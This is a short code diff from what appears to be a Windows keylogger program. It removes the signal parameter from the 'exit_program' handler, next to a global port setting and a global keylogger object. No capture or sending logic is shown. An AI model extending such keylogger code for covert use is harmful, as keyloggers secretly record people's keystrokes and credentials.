@@ -10,7 +10,7 @@ int g_port = DEFAULT_PORT_VALUE;
 
 keylogger* g_keylogger = new keylogger_local();
 
-BOOL exit_program(DWORD signal)
+BOOL exit_program()
 {
 	delete g_keylogger;
 
